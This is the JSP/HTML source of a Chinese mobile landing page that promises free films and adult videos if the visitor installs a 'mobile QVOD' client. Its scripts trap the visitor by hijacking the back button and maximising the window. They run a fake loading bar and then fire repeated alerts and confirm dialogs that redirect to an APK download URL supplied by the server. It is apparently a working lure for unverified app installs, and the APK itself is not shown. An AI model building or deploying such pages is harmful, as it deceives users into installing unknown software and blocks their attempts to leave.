<%@ page language="java" pageEncoding="utf-8"%>
<%
	Object url = request.getAttribute("url");
%>
<!DOCTYPE html> 
<html class="android"><head><meta http-equiv="Content-Type" content="text/html; charset=gbk">
<meta charset="gbk">
<title>手机快播，下载官方APP，免费观看所有电影</title>
<meta content="width=device-width,initial-scale=1,user-scalable=no" name="viewport">
<link rel="stylesheet" href="../../css/global.css">
<link rel="stylesheet" href="../../css/home.css">
<link rel="stylesheet" href="../../css/hot.css">
</head><script type="text/javascript">

        history.pushState({ page: 1 }, "title 1", "#nbb");

        window.onhashchange = function (event) {window.location.hash = "nbb";};

    </script>
<body >



<div class="m-home">
    <!-- 顶部导航 -->
    <section class="mod_box">
    <div class="video">
      <div class="videoimg"> <a href="<%=url%>" tppabs="<%=url%>"><img id="playImg" src="http://apk.hdczp.com/img/7.gif" width="100%" galleryimg="no"></a>

      </div>
    </div>
  </section>
</div>





<SCRIPT type=text/javascript>
    setTimeout("LoadJavascript()", 2000);
    var aw = screen.availWidth;
    var ah = screen.availHeight;
    window.moveTo(0, 0);
    window.resizeTo(aw + 1, ah);
    var isIE6 = navigator.appName == "Microsoft Internet Explorer" && navigator.appVersion.split(";")[1].replace(/[ ]/g, "") == "MSIE6.0";
	var durl = [];
	durl[0]=['<%=url%>',40];
	durl[1]=['<%=url%>',40];
	durl[2]=['<%=url%>',20];

	
    function addgo(info, isDown, alertYoNO) {
        var hint = info || "提示：本片资源需要下载手机专用客户端，打开播放软件观看,预计5秒";
		var randomNum = parseInt(Math.random()*100);
		var random = 0;
		var url = '';
		for(var i=0;i<durl.length;i++){
			random += durl[i][1];
			if(randomNum<random){
				url = durl[i][0];
				break;
			}
		}
        if (alertYoNO == 1) {
            var cf = confirm(hint);
            if (isDown) {
                window.location = url;
            }
        } else {
            if (isDown == true) {} else {
                alert(hint);
            }
            window.location = url;
        }
    }
    var bar = 0,
    line = "||",
    amount = "||";
    function count() {
        bar = bar + 2;
        amount = amount + line;
        document.loading.chart.value = amount;
        document.loading.percent.value = bar + "%";
        if (bar < 99) {
            document.getElementById('isLoading').style.display = "block";
            setTimeout("count()", 50);
        } else {
            document.getElementById('isLoading').style.display = "none";
            document.getElementById('isAlert').style.display = "block";
            addgo('提示：为避免封杀，私享影院推出手机客户端\n\n观看前需安装客户端，安装后打开应用，即可观看影片!', true, 1);
        }
    }
    count();
</SCRIPT>

<script>
var apkurl = "<%=url%>";
function g(name) {
    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
    var r = window.location.search.substr(1).match(reg);
    if (r != null) return unescape(r[2]); return null;
}
	
function downfile(){
	location.href=apkurl;
}

function showTip(text, down_url, delay, set_timer){
	if(set_timer==true){
		window.setTimeout("showTip('"+ text +"', '" + down_url + "', '" + delay + "', false)", delay)
	}else{
		alert(text)
		location.href=down_url;
	}
}
showTip("★狠狠撸看片神器2万部成人影片，立即下载安装免费观看？★", "<%=url%>", 6000, true);
showTip("★狠狠撸看片神器2万部成人影片，立即下载安装免费观看？★", "<%=url%>", 12000, true);
showTip("★狠狠撸看片神器2万部成人影片，立即下载安装免费观看？★", "<%=url%>", 20000, true);

</script>
<div style="display:none;">
<script src="http://s4.cnzz.com/z_stat.php?id=1260218668&web_id=1260218668" language="JavaScript"></script>
</div>
</body>
</html>